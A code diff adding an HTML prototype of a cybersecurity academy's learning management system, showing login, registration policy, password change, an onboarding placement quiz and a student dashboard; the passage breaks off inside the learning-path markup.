@@ -1,0 +1,2052 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Technotama Cybersecurity Academy - Learning Management System</title>
+  <!-- Google Fonts & FontAwesome Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <!-- ================= AUTH CONTAINER ================= -->
+  <!-- Screen 1: Login -->
+  <div id="screen-login" class="auth-container screen active">
+    <div class="auth-panel-left">
+      <div class="auth-card">
+        <div class="auth-logo">
+          <div class="logo-box">T</div>
+          <h2>Technotama<span>Cybersecurity Academy</span></h2>
+        </div>
+        <div class="auth-title">
+          <h1>Welcome Back</h1>
+          <p>Elevate your skills to professional cyber ready capability.</p>
+        </div>
+        
+        <div id="login-error-msg" class="alert alert-danger" style="display: none; margin-bottom: 20px; font-size: 13px; padding: 10px 14px;">
+          <i class="fa-solid fa-circle-exclamation" style="font-size: 16px;"></i>
+          <span id="login-error-text">Kredensial salah!</span>
+        </div>
+
+        <form id="login-form" onsubmit="event.preventDefault(); handleLogin();">
+          <div class="form-group">
+            <label class="form-label">Email or Username</label>
+            <input type="text" id="login-username" class="form-control" placeholder="name@domain.com" required value="andi.cyber">
+          </div>
+          <div class="form-group">
+            <label class="form-label">Password</label>
+            <div class="password-wrapper">
+              <input type="password" id="login-password" class="form-control" placeholder="••••••••" required value="password123">
+              <button type="button" class="password-toggle-btn" onclick="togglePasswordVisibility()" aria-label="Toggle password visibility">
+                <i class="fa-solid fa-eye" id="password-toggle-icon"></i>
+              </button>
+            </div>
+          </div>
+          <div class="form-group" style="display: flex; justify-content: space-between; align-items: center;">
+            <label class="checkbox-group">
+              <input type="checkbox" checked> Remember me
+            </label>
+            <a href="#" onclick="event.preventDefault(); openForgotPasswordModal();" style="font-size: 13px; color: var(--navy-light); font-weight: 500;">Forgot Password?</a>
+          </div>
+          <button type="submit" class="btn btn-primary" style="width: 100%; margin-top: 10px;">Sign In</button>
+        </form>
+        
+        <div style="margin-top: 24px; text-align: center; font-size: 14px; color: var(--gray-500);">
+          Belum memiliki akun? <a href="#" onclick="showScreen('register')" style="color: var(--navy-deep); font-weight: 600;">Info Pendaftaran</a>
+        </div>
+      </div>
+    </div>
+    
+    <div class="auth-panel-right">
+      <div>
+        <h2 style="color: var(--white); font-size: 32px; font-weight: 800; line-height: 1.2;">
+          Hands-on.<br>Practice-Dominant.<br>Career-Aligned.
+        </h2>
+        <p style="color: var(--gray-300); margin-top: 16px; font-size: 15px; max-width: 400px;">
+          Technotama Cybersecurity Academy transforms learners from knowledge seekers into job-ready cybersecurity professionals.
+        </p>
+      </div>
+      <div style="border-top: 1px solid var(--navy-light); padding-top: 20px;">
+        <span style="font-size: 11px; color: var(--gold); text-transform: uppercase; letter-spacing: 1px; font-weight: 700;">
+          Positioning Statement
+        </span>
+        <p style="font-size: 12px; color: var(--gray-400); margin-top: 4px;">
+          "Technotama is not just an LMS. It is a digital cybersecurity career ecosystem."
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Screen 2: Register -->
+  <div id="screen-register" class="auth-container screen">
+    <div class="auth-panel-left">
+      <div class="auth-card">
+        <div class="auth-logo">
+          <div class="logo-box">T</div>
+          <h2>Technotama<span>Cybersecurity Academy</span></h2>
+        </div>
+        <div class="auth-title">
+          <h1>Registration Restricted</h1>
+          <p>Pendaftaran akun siswa hanya dapat dilakukan secara resmi oleh administrator atau tim admisi academy.</p>
+        </div>
+        
+        <div class="alert alert-warning" style="margin-bottom: 24px;">
+          <i class="fa-solid fa-circle-exclamation" style="font-size: 20px;"></i>
+          <div>
+            <h4 style="font-weight: 700; margin-bottom: 4px;">Kebijakan Registrasi Internal</h4>
+            <p style="font-size: 13px; line-height: 1.5;">Untuk menjaga integritas kurikulum, kelayakan kompetensi dasar, dan alokasi instansi lab sandbox Cyber Range, pendaftaran mandiri dinonaktifkan.</p>
+          </div>
+        </div>
+
+        <div style="margin-bottom: 24px; font-size: 14px; color: var(--gray-600);">
+          <h4 style="color: var(--navy-deep); margin-bottom: 8px;">Prosedur Registrasi Resmi:</h4>
+          <ol style="margin-left: 20px; display: flex; flex-direction: column; gap: 8px;">
+            <li>Hubungi tim admisi di kantor registrasi Technotama atau melalui WhatsApp official.</li>
+            <li>Lengkapi seleksi berkas administrasi dan wawancara dasar.</li>
+            <li>Akun Anda akan didaftarkan oleh Administrator, dan kredensial masuk akan dikirimkan langsung ke email Anda.</li>
+          </ol>
+        </div>
+
+        <button onclick="alert('Membuka tautan formulir permohonan ke Admisi Academy...')" class="btn btn-primary" style="width: 100%; margin-bottom: 20px;">
+          <i class="fa-solid fa-paper-plane"></i> Hubungi Tim Admisi / Request Access
+        </button>
+        
+        <div style="text-align: center; font-size: 14px; color: var(--gray-500);">
+          Sudah memiliki akun? <a href="#" onclick="showScreen('login')" style="color: var(--navy-deep); font-weight: 600;">Sign In</a>
+        </div>
+      </div>
+    </div>
+    
+    <div class="auth-panel-right">
+      <div>
+        <h2 style="color: var(--white); font-size: 32px; font-weight: 800; line-height: 1.2;">
+          Unlocking Careers in Blue Team, SOC, Pentesting & GRC
+        </h2>
+        <p style="color: var(--gray-300); margin-top: 16px; font-size: 15px; max-width: 400px;">
+          Build a solid digital portfolio automatically by completing live labs, capturing CTF flags, and submitting capstone deliverables.
+        </p>
+      </div>
+      <div style="border-top: 1px solid var(--navy-light); padding-top: 20px;">
+        <span style="font-size: 11px; color: var(--gold); text-transform: uppercase; letter-spacing: 1px; font-weight: 700;">
+          Verified Credentials
+        </span>
+        <p style="font-size: 12px; color: var(--gray-400); margin-top: 4px;">
+          Our certifications and competency records are verified and directly shareable with hiring partners.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Screen: Change Password (First Login & 3-Month Rotation) -->
+  <div id="screen-change-password" class="content-wrapper screen" style="max-width: 500px; margin: 40px auto; background-color: var(--white); border-radius: var(--radius-lg); padding: 40px; box-shadow: var(--shadow-lg);">
+    <div style="text-align: center; margin-bottom: 24px;">
+      <div class="brand-logo" style="width: 50px; height: 50px; font-size: 24px; margin: 0 auto 16px auto;">T</div>
+      <h2>Ubah Password Akun</h2>
+      <p style="color: var(--gray-500); font-size: 14px; margin-top: 8px;">
+        Demi keamanan akun, Anda diwajibkan mengganti password default pada login pertama kali dan setiap 3 bulan.
+      </p>
+    </div>
+
+    <div id="change-pwd-error" class="alert alert-danger" style="display: none; font-size: 13px; padding: 10px 14px; margin-bottom: 20px;">
+      <i class="fa-solid fa-circle-exclamation"></i>
+      <span id="change-pwd-error-text">Password baru tidak cocok!</span>
+    </div>
+
+    <form id="change-password-form" onsubmit="event.preventDefault(); handleChangePassword();">
+      <div class="form-group">
+        <label class="form-label">Password Lama</label>
+        <div class="password-wrapper">
+          <input type="password" id="change-old-password" class="form-control" placeholder="••••••••" required>
+          <button type="button" class="password-toggle-btn" onclick="toggleFieldPasswordVisibility('change-old-password', this)">
+            <i class="fa-solid fa-eye"></i>
+          </button>
+        </div>
+      </div>
+      
+      <div class="form-group">
+        <label class="form-label">Password Baru</label>
+        <div class="password-wrapper">
+          <input type="password" id="change-new-password" class="form-control" placeholder="••••••••" required>
+          <button type="button" class="password-toggle-btn" onclick="toggleFieldPasswordVisibility('change-new-password', this)">
+            <i class="fa-solid fa-eye"></i>
+          </button>
+        </div>
+        <span style="font-size: 11px; color: var(--gray-500); display: block; margin-top: 4px;">Minimal 8 karakter, kombinasi huruf dan angka.</span>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Konfirmasi Password Baru</label>
+        <div class="password-wrapper">
+          <input type="password" id="change-confirm-password" class="form-control" placeholder="••••••••" required>
+          <button type="button" class="password-toggle-btn" onclick="toggleFieldPasswordVisibility('change-confirm-password', this)">
+            <i class="fa-solid fa-eye"></i>
+          </button>
+        </div>
+      </div>
+
+      <!-- Simulator control for testing 3 months rotation -->
+      <div style="background-color: var(--gray-100); padding: 12px; border-radius: var(--radius-md); font-size: 11px; margin-bottom: 20px; color: var(--gray-600); border-left: 3px solid var(--gold);">
+        <strong>Info Pengujian:</strong> Terakhir diubah: <span id="pwd-last-changed-status">Belum pernah</span>.
+        <br>
+        <a href="#" onclick="simulateThreeMonthsExpiry(); event.preventDefault();" style="color: var(--navy-light); font-weight: 700; text-decoration: underline; margin-top: 4px; display: inline-block;">[Simulasikan Kadaluarsa 3 Bulan]</a>
+      </div>
+
+      <button type="submit" class="btn btn-primary" style="width: 100%;">Perbarui Password & Lanjutkan</button>
+    </form>
+  </div>
+
+  <!-- Screen 3: Onboarding Wizard (Interactive) -->
+  <div id="screen-onboarding" class="content-wrapper screen" style="max-width: 900px; margin: 40px auto; background-color: var(--white); border-radius: var(--radius-lg); padding: 40px; box-shadow: var(--shadow-lg);">
+    <div class="stepper">
+      <div class="step-node active" id="step-node-1">
+        <div class="step-circle">1</div>
+        Welcome
+      </div>
+      <div class="step-node" id="step-node-2">
+        <div class="step-circle">2</div>
+        Profile Setup
+      </div>
+      <div class="step-node" id="step-node-3">
+        <div class="step-circle">3</div>
+        Career Target
+      </div>
+      <div class="step-node" id="step-node-4">
+        <div class="step-circle">4</div>
+        Placement Test
+      </div>
+      <div class="step-node" id="step-node-5">
+        <div class="step-circle">5</div>
+        Recommendation
+      </div>
+    </div>
+
+    <!-- Onboarding Step 1: Welcome -->
+    <div class="onboarding-step-view active" id="onboarding-step-1">
+      <div style="text-align: center; padding: 20px 0;">
+        <div class="brand-logo" style="width: 60px; height: 60px; font-size: 28px; margin: 0 auto 24px auto;">T</div>
+        <h1 style="font-size: 28px; margin-bottom: 12px;">Welcome to Technotama Cybersecurity Academy</h1>
+        <p style="color: var(--gray-500); max-width: 500px; margin: 0 auto 32px auto; font-size: 15px;">
+          You are embarking on a professional training path designed to transform you into an industry-ready cybersecurity professional. Let's customize your learning path.
+        </p>
+        <button class="btn btn-primary" onclick="changeOnboardingStep(2)">Get Started <i class="fa-solid fa-arrow-right"></i></button>
+      </div>
+    </div>
+
+    <!-- Onboarding Step 2: Profile -->
+    <div class="onboarding-step-view" id="onboarding-step-2">
+      <h2>Tell Us About Yourself</h2>
+      <p style="color: var(--gray-500); margin-bottom: 24px;">This helps our advisors and system tailor your career matching.</p>
+      
+      <div class="grid-2">
+        <div class="form-group">
+          <label class="form-label">Domicile</label>
+          <input type="text" id="onb-domicile" class="form-control" placeholder="Jakarta, Indonesia" value="Jakarta">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Latest Education</label>
+          <select id="onb-education" class="form-control">
+            <option>High School / SMK</option>
+            <option selected>Undergraduate Student</option>
+            <option>Bachelor Graduate</option>
+            <option>Other</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label class="form-label">IT Background</label>
+          <select id="onb-background" class="form-control">
+            <option value="IT" selected>IT Background (CS, IS, Networking)</option>
+            <option value="non-IT">Non-IT Background (Career Switcher)</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Prior Experience</label>
+          <select id="onb-experience" class="form-control">
+            <option value="beginner" selected>Beginner (No prior cybersecurity experience)</option>
+            <option value="intermediate">Junior Professional (Some IT/Cyber admin knowledge)</option>
+          </select>
+        </div>
+      </div>
+      
+      <div style="display: flex; justify-content: space-between; margin-top: 32px;">
+        <button class="btn btn-secondary" onclick="changeOnboardingStep(1)">Back</button>
+        <button class="btn btn-primary" onclick="changeOnboardingStep(3)">Next</button>
+      </div>
+    </div>
+
+    <!-- Onboarding Step 3: Career Target -->
+    <div class="onboarding-step-view" id="onboarding-step-3">
+      <h2>Choose Your Target Career Role</h2>
+      <p style="color: var(--gray-500); margin-bottom: 24px;">Your learning materials and lab exercises will orient towards this role.</p>
+      
+      <div class="career-grid">
+        <div class="career-option selected" data-role="SOC Analyst" onclick="selectCareerOption(this)">
+          <i class="fa-solid fa-shield-halved"></i>
+          <h4>SOC Analyst</h4>
+          <span style="font-size: 11px; color: var(--gray-500);">Blue Team Ops</span>
+        </div>
+        <div class="career-option" data-role="Junior Pentester" onclick="selectCareerOption(this)">
+          <i class="fa-solid fa-terminal"></i>
+          <h4>Junior Pentester</h4>
+          <span style="font-size: 11px; color: var(--gray-500);">Offensive Security</span>
+        </div>
+        <div class="career-option" data-role="Incident Responder" onclick="selectCareerOption(this)">
+          <i class="fa-solid fa-kit-medical"></i>
+          <h4>Incident Response</h4>
+          <span style="font-size: 11px; color: var(--gray-500);">DFIR Specialist</span>
+        </div>
+        <div class="career-option" data-role="GRC Analyst" onclick="selectCareerOption(this)">
+          <i class="fa-solid fa-file-shield"></i>
+          <h4>GRC Analyst</h4>
+          <span style="font-size: 11px; color: var(--gray-500);">Governance & Audit</span>
+        </div>
+      </div>
+      
+      <div style="display: flex; justify-content: space-between; margin-top: 32px;">
+        <button class="btn btn-secondary" onclick="changeOnboardingStep(2)">Back</button>
+        <button class="btn btn-primary" onclick="changeOnboardingStep(4)">Next: Skills Assessment</button>
+      </div>
+    </div>
+
+    <!-- Onboarding Step 4: Placement Test (Interactive) -->
+    <!-- Screen 4: Placement Test -->
+    <div class="onboarding-step-view" id="onboarding-step-4">
+      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
+        <h2>Skills Placement Test</h2>
+        <span class="badge badge-blue" id="quiz-progress-badge">Question 1 of 3</span>
+      </div>
+      <p style="color: var(--gray-500); margin-bottom: 24px;">Answer the questions below to evaluate your current technical background. It helps us recommend the starting level.</p>
+      
+      <div class="card" style="margin-bottom: 24px; padding: 24px;">
+        <!-- Question 1 -->
+        <div class="quiz-question" id="q1">
+          <h3 style="font-size: 16px; margin-bottom: 12px;">1. What port does HTTP standard traffic run on by default?</h3>
+          <div class="quiz-options">
+            <button class="btn quiz-option-btn" onclick="selectQuizAnswer(1, 'A', this)">A. Port 443</button>
+            <button class="btn quiz-option-btn" onclick="selectQuizAnswer(1, 'B', this)">B. Port 80</button>
+            <button class="btn quiz-option-btn" onclick="selectQuizAnswer(1, 'C', this)">C. Port 22</button>
+            <button class="btn quiz-option-btn" onclick="selectQuizAnswer(1, 'D', this)">D. Port 8080</button>
+          </div>
+        </div>
+        
+        <!-- Question 2 (Hidden initially, shown sequentially) -->
+        <div class="quiz-question" id="q2" style="display: none;">
+          <h3 style="font-size: 16px; margin-bottom: 12px;">2. Which command in Linux is used to display network connections, routing tables, and interface statistics?</h3>
+          <div class="quiz-options">
+            <button class="btn quiz-option-btn" onclick="selectQuizAnswer(2, 'A', this)">A. chmod</button>
+            <button class="btn quiz-option-btn" onclick="selectQuizAnswer(2, 'B', this)">B. grep</button>
+            <button class="btn quiz-option-btn" onclick="selectQuizAnswer(2, 'C', this)">C. netstat</button>
+            <button class="btn quiz-option-btn" onclick="selectQuizAnswer(2, 'D', this)">D. ifconfig</button>
+          </div>
+        </div>
+
+        <!-- Question 3 -->
+        <div class="quiz-question" id="q3" style="display: none;">
+          <h3 style="font-size: 16px; margin-bottom: 12px;">3. What type of cyber attack specifically attempts to intercept and manipulate communication between two parties?</h3>
+          <div class="quiz-options">
+            <button class="btn quiz-option-btn" onclick="selectQuizAnswer(3, 'A', this)">A. Man-in-the-Middle (MitM)</button>
+            <button class="btn quiz-option-btn" onclick="selectQuizAnswer(3, 'B', this)">B. SQL Injection</button>
+            <button class="btn quiz-option-btn" onclick="selectQuizAnswer(3, 'C', this)">C. Ransomware</button>
+            <button class="btn quiz-option-btn" onclick="selectQuizAnswer(3, 'D', this)">D. DDoS</button>
+          </div>
+        </div>
+      </div>
+      
+      <div style="display: flex; justify-content: space-between;">
+        <button class="btn btn-secondary" onclick="changeOnboardingStep(3)">Back</button>
+        <button class="btn btn-primary" id="btn-quiz-next" onclick="nextQuizQuestion()">Next Question <i class="fa-solid fa-chevron-right"></i></button>
+      </div>
+    </div>
+
+    <!-- Onboarding Step 5: Learning Recommendation -->
+    <!-- Screen 5: Learning Recommendation -->
+    <div class="onboarding-step-view" id="onboarding-step-5">
+      <h2>Your Recommended Learning Path</h2>
+      <p style="color: var(--gray-500); margin-bottom: 24px;">Based on your assessment results, we suggest starting with our core foundational track.</p>
+      
+      <div class="alert alert-success">
+        <i class="fa-solid fa-circle-check" style="font-size: 20px;"></i>
+        <div>
+          <h4 style="font-weight: 700;">Assessment Complete! Score: 100%</h4>
+          <p style="font-size: 13px;">You have successfully demonstrated strong IT fundamentals. We recommend starting at <strong>Level 1 (Basic) Module 3</strong> or directly jumping to <strong>Level 2 (Intermediate)</strong>.</p>
+        </div>
+      </div>
+
+      <div class="card card-premium" style="margin-bottom: 24px;">
+        <h3 style="color: var(--navy-deep); margin-bottom: 12px;">Suggested Starting Point:</h3>
+        <h2 style="color: var(--gold-hover); margin-bottom: 16px;">Level 1 — Basic: Cybersecurity Operations Foundation</h2>
+        
+        <div style="display: flex; gap: 40px; margin-bottom: 20px;">
+          <div>
+            <span style="font-size: 11px; text-transform: uppercase; color: var(--gray-500); display: block;">Target Role</span>
+            <strong style="font-size: 15px; color: var(--navy-deep);">Junior SOC Analyst</strong>
+          </div>
+          <div>
+            <span style="font-size: 11px; text-transform: uppercase; color: var(--gray-500); display: block;">Estimated Duration</span>
+            <strong style="font-size: 15px; color: var(--navy-deep);">8 Weeks (120 hrs)</strong>
+          </div>
+          <div>
+            <span style="font-size: 11px; text-transform: uppercase; color: var(--gray-500); display: block;">Practical Focus</span>
+            <strong style="font-size: 15px; color: var(--navy-deep);">80% Lab / 20% Theory</strong>
+          </div>
+        </div>
+
+        <div class="progress-container">
+          <div class="progress-label-wrap">
+            <span>Path Completion Blueprint</span>
+            <span>0% Complete</span>
+          </div>
+          <div class="progress-bar-bg">
+            <div class="progress-bar-fill gold" style="width: 0%;"></div>
+          </div>
+        </div>
+      </div>
+
+      <div style="display: flex; justify-content: flex-end; gap: 12px;">
+        <button class="btn btn-secondary" onclick="changeOnboardingStep(4)">Retake Test</button>
+        <button class="btn btn-primary" onclick="completeOnboarding()">Access My Dashboard <i class="fa-solid fa-gauge-high"></i></button>
+      </div>
+    </div>
+  </div>
+
+
+  <!-- ================= MAIN APPLICATION LAYOUT ================= -->
+  <div id="main-layout" class="app-container" style="display: none;">
+    
+    <!-- Sidebar Navigation -->
+    <aside class="sidebar" id="sidebar">
+      <div class="brand">
+        <div class="brand-logo">T</div>
+        <div class="brand-text">
+          Technotama
+          <span>Cybersecurity Academy</span>
+        </div>
+      </div>
+      
+      <ul class="nav-menu">
+        <li class="nav-item">
+          <a href="#" class="nav-link active" onclick="navigateTo('dashboard', this)">
+            <i class="fa-solid fa-gauge-high"></i>
+            <span>Dashboard</span>
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="#" class="nav-link" onclick="navigateTo('learning-path', this)">
+            <i class="fa-solid fa-road"></i>
+            <span>Learning Path</span>
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="#" class="nav-link" onclick="navigateTo('course-detail', this)">
+            <i class="fa-solid fa-book-open"></i>
+            <span>My Learning</span>
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="#" class="nav-link" onclick="navigateTo('cyber-lab', this)">
+            <i class="fa-solid fa-flask"></i>
+            <span>Cyber Lab</span>
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="#" class="nav-link" onclick="navigateTo('ctf-challenges', this)">
+            <i class="fa-solid fa-flag"></i>
+            <span>Challenges / CTF</span>
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="#" class="nav-link" onclick="navigateTo('assessments', this)">
+            <i class="fa-solid fa-file-invoice"></i>
+            <span>Assessments</span>
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="#" class="nav-link" onclick="navigateTo('capstone', this)">
+            <i class="fa-solid fa-diagram-project"></i>
+            <span>Capstone Project</span>
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="#" class="nav-link" onclick="navigateTo('portfolio', this)">
+            <i class="fa-solid fa-folder-open"></i>
+            <span>Portfolio</span>
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="#" class="nav-link" onclick="navigateTo('career-center', this)">
+            <i class="fa-solid fa-briefcase"></i>
+            <span>Career Center</span>
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="#" class="nav-link" onclick="navigateTo('credentials', this)">
+            <i class="fa-solid fa-award"></i>
+            <span>Credentials</span>
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="#" class="nav-link" onclick="navigateTo('community', this)">
+            <i class="fa-solid fa-users"></i>
+            <span>Community</span>
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="#" class="nav-link" onclick="navigateTo('profile', this)">
+            <i class="fa-solid fa-user-astronaut"></i>
+            <span>Profile</span>
+          </a>
+        </li>
+      </ul>
+      
+      <div class="sidebar-toggle-btn" onclick="toggleSidebar()">
+        <i class="fa-solid fa-angles-left" id="sidebar-toggle-icon"></i>
+      </div>
+    </aside>
+
+    <!-- Main Content Area -->
+    <main class="main-content" id="main-content">
+      
+      <!-- Top Header -->
+      <header class="header">
+        <div class="header-left">
+          <div class="search-bar">
+            <i class="fa-solid fa-magnifying-glass" style="color: var(--gray-400);"></i>
+            <input type="text" placeholder="Search modules, labs, CTFs...">
+          </div>
+        </div>
+        
+        <div class="header-right">
+          <!-- Role Switcher Dropdown (Clickable prototype feature) -->
+          <div class="role-switcher">
+            <i class="fa-solid fa-user-gear"></i>
+            <select id="role-select" onchange="switchRole(this.value)">
+              <option value="student" selected>Student View</option>
+              <option value="instructor">Instructor View</option>
+              <option value="assessor">Assessor View</option>
+              <option value="admin">Admin View</option>
+            </select>
+          </div>
+          
+          <button class="icon-btn" onclick="toggleNotificationTray()">
+            <i class="fa-solid fa-bell"></i>
+            <span class="badge-dot"></span>
+          </button>
+          
+          <div class="user-profile-menu" onclick="showScreenDirect('profile')">
+            <div class="avatar-wrapper">
+              <img class="avatar" src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=256&auto=format&fit=crop" alt="User Profile">
+              <span class="status-dot"></span>
+            </div>
+            <div class="user-meta">
+              <span class="user-name" id="app-username">Andi Wijaya</span>
+              <span class="user-role" id="app-userrole">Student</span>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Notification Tray popover -->
+        <!-- Screen 25: Notifications Panel -->
+        <div class="notification-tray" id="notification-tray">
+          <div class="notification-tray-header">
+            <span>Notifications</span>
+            <a href="#" onclick="markAllNotificationsRead()" style="font-size: 11px; color: var(--gold-hover);">Mark all read</a>
+          </div>
+          <div class="notification-list">
+            <div class="notification-item unread" onclick="handleNotificationClick('lab')">
+              <i class="fa-solid fa-flask"></i>
+              <div class="notification-item-text">
+                <strong>Lab waiting:</strong> Your Week 3 lab packet analysis is ready to launch.
+                <div class="notification-item-time">10 mins ago</div>
+              </div>
+            </div>
+            <div class="notification-item unread" onclick="handleNotificationClick('mentor')">
+              <i class="fa-solid fa-message"></i>
+              <div class="notification-item-text">
+                <strong>Mentor review:</strong> Assessor updated feedback on Case Study 1.
+                <div class="notification-item-time">2 hours ago</div>
+              </div>
+            </div>
+            <div class="notification-item" onclick="handleNotificationClick('career')">
+              <i class="fa-solid fa-briefcase"></i>
+              <div class="notification-item-text">
+                <strong>Career Match:</strong> 3 jobs match your SOC Analyst skill score.
+                <div class="notification-item-time">1 day ago</div>
+              </div>
+            </div>
+          </div>
+          <div style="padding: 12px; text-align: center; border-top: 1px solid var(--gray-100);">
+            <a href="#" onclick="showScreenDirect('notifications')" style="font-size: 12px; font-weight: 600; color: var(--navy-deep);">View all notifications</a>
+          </div>
+        </div>
+      </header>
+
+      <!-- App View Screens Container -->
+      <div class="content-wrapper" id="page-content">
+
+        <!-- ================= STUDENT VIEW SCREENS ================= -->
+        
+        <!-- Screen 6: Student Dashboard -->
+        <div id="view-dashboard" class="screen active">
+          <div class="screen-header">
+            <div>
+              <h1 id="welcome-text">Good morning, Andi Wijaya</h1>
+              <p class="screen-description">Ready to strengthen your cyber skills today? Your target target is SOC Analyst.</p>
+            </div>
+            <button class="btn btn-primary" onclick="showScreenDirect('course-detail')">Continue Learning <i class="fa-solid fa-play"></i></button>
+          </div>
+          
+          <div class="hero-card" style="margin-bottom: 28px;">
+            <div class="hero-card-pattern">&lt;/&gt;</div>
+            <div class="hero-card-grid">
+              <div>
+                <span class="badge badge-gold" style="margin-bottom: 12px;">Active Program</span>
+                <h2 style="font-size: 24px; font-weight: 800; margin-bottom: 8px;">Cybersecurity Academy — Level 1 Basic</h2>
+                <p style="color: var(--gray-300); font-size: 14px; margin-bottom: 20px;">
+                  Current Module: <strong>TCP/IP & Traffic Analysis</strong> | Next Up: <strong>Wireshark Packet Analysis Lab</strong>
+                </p>
+                <div class="hero-card-stats">
+                  <div class="stat-item">
+                    <div class="stat-value">Week 5 of 8</div>
+                    <div class="stat-label">Timeframe</div>
+                  </div>
+                  <div class="stat-item">
+                    <div class="stat-value">68%</div>
+                    <div class="stat-label">Completion</div>
+                  </div>
+                  <div class="stat-item">
+                    <div class="stat-value">6 / 8 Labs</div>
+                    <div class="stat-label">Practical Tasks</div>
+                  </div>
+                </div>
+              </div>
+              
+              <div style="display: flex; flex-direction: column; justify-content: center; align-items: flex-end; gap: 12px;">
+                <button class="btn btn-gold" onclick="launchLabSimulation('Wireshark Packet Analysis')">Launch Active Lab <i class="fa-solid fa-rocket"></i></button>
+                <button class="btn btn-outline" style="border-color: var(--white); color: var(--white);" onclick="showScreenDirect('learning-path')">View Skill Journey</button>
+              </div>
+            </div>
+          </div>
+
+          <div class="grid-3">
+            <!-- Card: Learning Progress (Screen 7 Details inside) -->
+            <div class="card">
+              <h3 class="card-title">Learning Progress <span class="badge badge-green">On Track</span></h3>
+              <div style="display: flex; align-items: center; justify-content: space-around; margin-bottom: 20px; gap: 12px;">
+                <div class="progress-ring-wrap">
+                  <!-- SVG Circle Progress Ring -->
+                  <svg width="80" height="80">
+                    <circle cx="40" cy="40" r="34" stroke="var(--gray-200)" stroke-width="6" fill="transparent"/>
+                    <circle cx="40" cy="40" r="34" stroke="var(--navy-deep)" stroke-width="6" fill="transparent" stroke-dasharray="213.6" stroke-dashoffset="68.3" stroke-linecap="round"/>
+                  </svg>
+                  <span class="progress-ring-text">68%</span>
+                </div>
+                <div>
+                  <div style="font-size: 13px; font-weight: 600;">Theory Progress: <span style="color:var(--success);">82%</span></div>
+                  <div style="font-size: 13px; font-weight: 600;">Hands-on Labs: <span style="color:var(--success);">71%</span></div>
+                  <div style="font-size: 13px; font-weight: 600;">Assessments: <span style="color:var(--success);">78%</span></div>
+                </div>
+              </div>
+              <button class="btn btn-secondary btn-sm" style="width: 100%;" onclick="showScreenDirect('competency')">View Competency Matrix</button>
+            </div>
+            
+            <!-- Card: Active Career Match -->
+            <div class="card">
+              <h3 class="card-title">Career Readiness <span class="badge badge-gold">78% Match</span></h3>
+              <p style="font-size: 13px; color: var(--gray-600); margin-bottom: 16px;">
+                Your current completed competencies match you for: <strong>Junior SOC Analyst (Entry)</strong>.
+              </p>
+              <div class="progress-container" style="margin-bottom: 20px;">
+                <div class="progress-label-wrap">
+                  <span>Skills Scorecard</span>
+                  <span>78/100</span>
+                </div>
+                <div class="progress-bar-bg">
+                  <div class="progress-bar-fill gold" style="width: 78%;"></div>
+                </div>
+              </div>
+              <button class="btn btn-secondary btn-sm" style="width: 100%;" onclick="showScreenDirect('career-center')">Enter Career Center</button>
+            </div>
+
+            <!-- Card: Recent Credentials (Screen 23) -->
+            <div class="card">
+              <h3 class="card-title">Latest Badges</h3>
+              <div style="display: flex; gap: 12px; margin-bottom: 16px;">
+                <div class="vault-badge-item unlocked" style="flex: 1; padding: 10px; border-radius: 8px;">
+                  <div class="badge-art" style="width:40px; height:40px; font-size:16px;">🐧</div>
+                  <div style="font-size:10px; font-weight:700; margin-top:4px;">Linux Starter</div>
+                </div>
+                <div class="vault-badge-item unlocked" style="flex: 1; padding: 10px; border-radius: 8px;">
+                  <div class="badge-art" style="width:40px; height:40px; font-size:16px;">🔬</div>
+                  <div style="font-size:10px; font-weight:700; margin-top:4px;">Traffic Hunter</div>
+                </div>
+                <div class="vault-badge-item" style="flex: 1; padding: 10px; border-radius: 8px;">
+                  <div class="badge-art" style="width:40px; height:40px; font-size:16px;">🛡️</div>
+                  <div style="font-size:10px; font-weight:700; margin-top:4px;">SOC Ops</div>
+                </div>
+              </div>
+              <button class="btn btn-secondary btn-sm" style="width: 100%;" onclick="showScreenDirect('credentials')">View Credential Wallet</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Screen 7: Learning Path (Skill Journey Map) -->
+        <div id="view-learning-path" class="screen">
+          <div class="screen-header">
+            <div>
+              <h1>Learning Path Roadmap</h1>
+              <p class="screen-description">Visual map detailing your progression from foundational structures to security engineering.</p>
+            </div>
+          </div>
+          
+          <div class="skill-journey-map">
+            <!-- Level 1 Node -->
+            <div class="journey-level active">
+              <div class="level-meta">
+                <div>
+                  <span class="level-badge">Level 1</span>
+                  <h3 style="display: inline-block; margin-left: 8px;">Fondasi IT & Cybersecurity</h3>
+                </div>
+                <span style="font-size: 13px; color: var(--gray-500); font-weight: 500;"><i class="fa-solid fa-clock"></i> 4 Weeks | 40 Hours</span>
+              </div>
+              <div class="journey-nodes">
+                <div class="journey-node completed" onclick="showScreenDirect('course-detail')">
+                  <div class="journey-node-icon"><i class="fa-solid fa-shield"></i></div>
+                  <div>
+                    <h4 style="font-size:13px;">Intro to Security</h4>
+                    <span style="font-size:11px; color: var(--success-text);">Completed</span>
+                  </div>
+                </div>
+                <div class="journey-node completed" onclick="showScreenDirect('course-detail')">
+                  <div class="journey-node-icon"><i class="fa-brands fa-linux"></i></div>
+                  <div>
